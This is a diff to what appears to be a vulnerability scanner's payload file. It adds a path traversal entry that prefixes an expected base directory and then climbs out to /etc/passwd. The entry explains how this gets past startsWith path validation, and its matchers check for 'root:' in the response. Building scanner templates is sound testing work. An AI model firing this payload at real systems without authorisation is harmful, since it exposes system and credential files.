@@ -117,6 +117,23 @@
           "severity": "critical",
           "confidence_boost": 85,
           "variables": {}
+        },
+        {
+          "payload": "/var/www/images/../../../../etc/passwd",
+          "description": "Start-of-path validation bypass — when the app requires the resolved/supplied path to BEGIN with an expected base directory (e.g. /var/www/images/), prefix that exact base so the startsWith check passes, then traverse back out with ../ to reach /etc/passwd. The prefix satisfies the validator; the OS collapses the traversal after it.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "root:x:0",
+                "root:"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
         }
       ]
     },
